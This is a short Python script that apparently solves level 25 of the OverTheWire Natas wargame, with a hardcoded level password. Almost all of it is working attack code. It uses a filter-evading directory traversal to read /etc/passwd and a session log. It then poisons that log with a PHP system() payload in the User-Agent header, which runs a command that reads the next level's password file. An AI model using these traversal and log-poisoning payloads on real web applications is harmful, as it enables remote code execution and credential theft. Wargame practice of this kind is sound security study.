import requests

username = "natas25"
password = "GHF6X7YwACaYYssHVY05cFq83hRktl4c"

session = requests.Session()

url = "http://{}.natas.labs.overthewire.org/".format(username)

response = session.get(url, auth=(username, password))

# Trying to bypass the directory traversal
# response = session.post(
#     url, data={"lang": "..././..././..././..././..././etc/passwd"}, auth=(username, password))

# Viewing the logs
# session_id = session.cookies["PHPSESSID"]
# response = session.post(
#     url, data={"lang": "..././..././..././..././..././var/www/natas/natas25/logs/natas25_{}.log".format(session_id)}, auth=(username, password))

# Altering the User-Agent
session_id = session.cookies["PHPSESSID"]
header = {"User-Agent": "<?php system('cat /etc/natas_webpass/natas26'); ?>"}
response = session.post(
    url, data={"lang": "..././..././..././..././..././var/www/natas/natas25/logs/natas25_{}.log".format(session_id)}, auth=(username, password), headers=header)

content = response.text
print(content)
